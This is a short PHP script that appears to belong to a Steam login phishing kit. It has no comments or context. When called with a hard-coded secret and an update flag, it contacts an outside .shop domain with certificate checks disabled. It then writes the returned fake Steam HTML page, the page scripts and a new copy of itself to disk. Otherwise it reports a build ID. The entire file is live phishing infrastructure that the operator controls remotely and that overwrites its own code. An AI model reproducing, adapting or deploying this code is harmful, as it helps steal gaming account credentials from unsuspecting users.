<?php

$phpName = "e8b95504232b39d114777224c885ca16.php";
$steamHtmlName = "bvomeyumq21y.html";
$steamScriptName = "0pxwmhp9a8i8.js";
$windowScriptName = "2y7gmddrojat.js";
$domainToLogin = "fgrbsgdbfgdbf.shop";
$resourceUrl = "https://fgrbsgdbfgdbf.shop/fwrbelf9giti8g9pjwlbqqraqz5er7iwu2his";
$postData = [
    "secret" => "c249f543d53953daf596b4074d8cbfdd",
    "authBtnClass" => "lkk380gf9d6j",
    "steamHtmlName" => $steamHtmlName,
    "steamScriptName" => $steamScriptName,
    "windowScriptName" => $windowScriptName,
];
$buildId = "152d21dc-e592-43bb-86d8-8ce8b3c760f7";


$update = isset($_GET['update']) && $_GET['update'] === 'true';
$secret = isset($_GET['secret']) ?$_GET["secret"] : null;

if($secret !== $postData["secret"]){
	echo "false";
} else if($update) {
	$ch = curl_init();

	curl_setopt($ch, CURLOPT_URL, $resourceUrl);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

	$response = curl_exec($ch);

	if(curl_errno($ch)) {
		echo 'Error:' . curl_error($ch);
	} else {
		$responseData = json_decode($response, true);

		if (isset($responseData['windowScript'])) {
			file_put_contents($windowScriptName, $responseData["windowScript"]);
		}

		if (isset($responseData['steamScript'])) {
			file_put_contents($steamScriptName, $responseData["steamScript"]);
		}

		if (isset($responseData['steamFile'])) {
			file_put_contents($steamHtmlName, $responseData["steamFile"]);
		}

		if (isset($responseData['updatePhp'])) {
			file_put_contents($phpName, $responseData["updatePhp"]);
		}

		echo "success";
	}

	curl_close($ch);
} else {
	header('Content-Type: application/json');

	echo json_encode([
		"success" => true,
		"buildId" => $buildId
	]);
}

?>